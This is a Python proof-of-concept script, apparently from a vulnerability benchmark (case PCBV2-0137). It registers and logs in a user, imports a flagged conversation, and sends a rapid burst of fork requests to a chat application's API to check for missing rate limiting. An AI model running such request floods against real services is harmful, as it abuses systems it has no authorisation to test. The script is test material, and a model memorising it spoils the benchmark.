#!/usr/bin/env python3
"""Seed executor for PCBV2-0137. verify.sh --seed is the real entrypoint.

Floods POST /api/convos/fork after register/login + importing a convo whose
title is RUN_FLAG. Used only if something invokes poc/seed_exec.py directly.
"""
import hashlib
import json
import os
import sys
import time
import urllib.error
import urllib.request
import uuid

BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
)
PASS = "PcbPass123!"
BURST = 8


def http(method, url, data=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return -1, str(e).encode()


def main():
    base = os.environ.get("PCB_BASE") or os.environ.get("PCB_TARGET_BASE")
    port = os.environ.get("PCB_TARGET_PORT")
    if not base and port:
        base = f"http://127.0.0.1:{port}"
    if not base:
        print(json.dumps({"ok": False, "body": "PCB_BASE missing"}))
        return 20
    flag = os.environ.get("RUN_FLAG") or os.environ.get("PCB_FLAG") or "pcbflag"
    slug = hashlib.sha256(flag.encode()).hexdigest()[:12]
    email = f"u{slug}@pcb.local"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": BROWSER_UA,
    }
    http("POST", f"{base}/api/auth/register", data=json.dumps({
        "name": f"pcb_{slug}", "email": email, "password": PASS, "confirm_password": PASS,
    }).encode(), headers=headers, timeout=20)
    st, body = http("POST", f"{base}/api/auth/login", data=json.dumps({
        "email": email, "password": PASS,
    }).encode(), headers=headers, timeout=20)
    try:
        token = json.loads(body).get("token")
    except Exception:
        token = None
    if not token:
        print(json.dumps({"ok": False, "status": st, "body": body[:200].decode("utf-8", "replace")}))
        return 20
    auth = {**headers, "Authorization": f"Bearer {token}"}
    cid = str(uuid.uuid4())
    mid = str(uuid.uuid4())
    blob = json.dumps({
        "conversationId": cid, "endpoint": "openAI", "title": flag,
        "messages": [{
            "messageId": mid, "conversationId": cid, "text": flag,
            "sender": "user", "isCreatedByUser": True, "parentMessageId": None,
        }],
    }).encode()
    boundary = "----pcb" + uuid.uuid4().hex
    mp = (
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; "
        f"filename=\"{flag}.json\"\r\nContent-Type: application/json\r\n\r\n"
    ).encode() + blob + f"\r\n--{boundary}--\r\n".encode()
    http("POST", f"{base}/api/convos/import", data=mp, headers={
        **auth, "Content-Type": f"multipart/form-data; boundary={boundary}",
    }, timeout=60)
    time.sleep(1)
    st, raw = http("GET", f"{base}/api/convos?limit=25", headers=auth, timeout=20)
    try:
        payload = json.loads(raw)
        convos = payload.get("conversations") or []
    except Exception:
        convos = []
    src = next((c.get("conversationId") for c in convos if flag in str(c.get("title") or "")), cid)
    n429 = 0
    last = 0
    last_body = ""
    for _ in range(BURST):
        st, raw = http("POST", f"{base}/api/convos/fork", data=json.dumps({
            "conversationId": src, "option": "targetLevel",
        }).encode(), headers=auth, timeout=60)
        last = st
        last_body = raw.decode("utf-8", "replace")[:300]
        if st == 429:
            n429 += 1
        time.sleep(0.05)
    print(json.dumps({"ok": n429 == 0, "status": last, "n429": n429, "body": last_body}))
    return 0


if __name__ == "__main__":
    sys.exit(main())
